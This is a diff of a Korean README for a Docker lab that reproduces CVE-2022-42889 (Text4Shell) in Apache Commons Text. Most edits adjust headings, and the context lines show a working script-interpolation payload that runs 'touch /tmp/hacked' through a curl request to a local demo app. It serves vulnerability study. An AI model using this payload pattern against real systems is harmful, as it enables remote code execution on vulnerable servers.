@@ -34,7 +34,7 @@ Apache Commons Text의 `StringSubstitutor` 클래스는 `${prefix:name}` 형식�
 ${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/hacked')}
 ```
 
-### 디렉터리 구조
+## 디렉터리 구조
 ```text
 CVE-2022-42889/
 ├── docker-compose.yml
@@ -49,12 +49,12 @@ CVE-2022-42889/
                         └── DemoApplication.java
 ```
 
-### 시연
-컨테이너 빌드 및 실행
+## 시연
+### 컨테이너 빌드 및 실행
 ``` text
 docker-compose up --build -d
 ```
-악성 입력 전달
+### 악성 입력 전달
 
 ``` text
 ${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/hacked')}
@@ -70,5 +70,6 @@ curl "http://localhost:8080/test?input=%24%7Bscript%3Ajavascript%3Ajava.lang.Run
 ![PoC 요청 결과](./CVE-2022-42889/1.png)
 명령이 실행 중이며 아직 종료되지 않았다는 의미이다. (touch 명령은 바로 끝남)
 
-컨테이너 내부 파일 생성 여부 확인
+### 컨테이너 내부 파일 생성 여부 확인
 ![PoC 요청 결과](./CVE-2022-42889/2.png)
+/tmp/hacked 파일이 생성된 것을 확인할 수 있다.
